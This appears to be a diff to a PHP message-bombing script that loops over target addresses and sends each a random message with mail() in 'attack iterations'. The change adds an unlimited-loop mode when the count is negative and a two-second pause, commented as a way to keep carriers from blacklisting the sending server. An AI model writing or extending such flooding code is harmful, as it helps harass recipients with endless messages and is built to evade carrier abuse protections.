@@ -81,7 +81,7 @@
 			}
 			
 			// One attack iteration to all targets.
-			for ($i = 0; $i < $n; ++$i) {
+			for ($i = 0; $n < 0 || $i < $n; ++$i) {
 				
 				// Generates a random message to be sent to each target.
 				$message = $this -> messages[rand(0, count($this -> messages) - 1)];
@@ -105,6 +105,9 @@
 						mail($target, "", $message, $headers); // Arg 2 no subject.
 					}
 				}
+				
+				// Sleep for 2 seconds so the carriers do not blacklist your server
+				sleep(2);
 				
 			}
 
